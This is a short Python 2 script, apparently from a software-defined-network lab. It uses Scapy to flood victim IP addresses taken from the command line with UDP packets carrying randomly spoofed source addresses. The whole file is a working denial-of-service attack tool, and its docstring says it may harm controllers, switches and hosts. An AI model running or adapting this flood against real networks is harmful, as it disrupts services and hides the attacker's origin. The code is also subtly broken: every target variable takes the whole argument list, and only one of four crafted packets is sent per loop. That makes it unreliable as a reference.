#run on host's xterm terminal "python -E multi-udp.py victim1_ip victim2_ip victim3_ip victim4_ip"
"""
UDP flooding attack use a rage of target host IP address with faked source IP addresses
This attack might harmful to the controller, switch and even hosts within the network
send 1000 packets with the rate of 33packets per second to the rage of user input random hosts (within the rage of input targets)
"""

#!/usr/bin/env python
import sys
import time
from os import popen
from scapy.all import sendp, IP, UDP, Ether, TCP, RandShort
from random import randrange

def sourceIPgen():
    # this function generates random IP addresses
    # these values are not valid for first octet of IP address
    not_valid = [10,127,254,255,1,2,169,172,192]
    first = randrange(1, 256)

    while first in not_valid:
        first = randrange(1, 256)
    print first
    ip = ".".join([str(first), str(randrange(1, 256)), str(randrange(1, 256)), str(randrange(1, 256))])
    print ip
    return ip
    # send the generated IPs

def main():
    # getting the ip address to send attack packets
    dstIP1 = sys.argv[1:]
    dstIP2 = sys.argv[1:]
    dstIP3 = sys.argv[1:]
    dstIP4 = sys.argv[1:]
    # open interface eth0 to send packets
    interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()
    print (repr(interface))
    for i in xrange(1000):
        # form the packet
        packets = Ether() / IP(dst=dstIP1, src=sourceIPgen()) / UDP(dport=int(RandShort()), sport=int(RandShort()))
        print(repr(packets))
        packets = Ether() / IP(dst=dstIP2, src=sourceIPgen()) / UDP(dport=int(RandShort()), sport=int(RandShort()))
        print(repr(packets))
        packets = Ether() / IP(dst=dstIP3, src=sourceIPgen()) / UDP(dport=int(RandShort()), sport=int(RandShort()))
        print(repr(packets))
        packets = Ether() / IP(dst=dstIP4, src=sourceIPgen()) / UDP(dport=int(RandShort()), sport=int(RandShort()))
        print(repr(packets))

        # send packet with the defined interval (seconds)
        sendp(packets, iface=interface.rstrip(), inter=0.05)
    # main

if __name__ == "__main__":
    main()
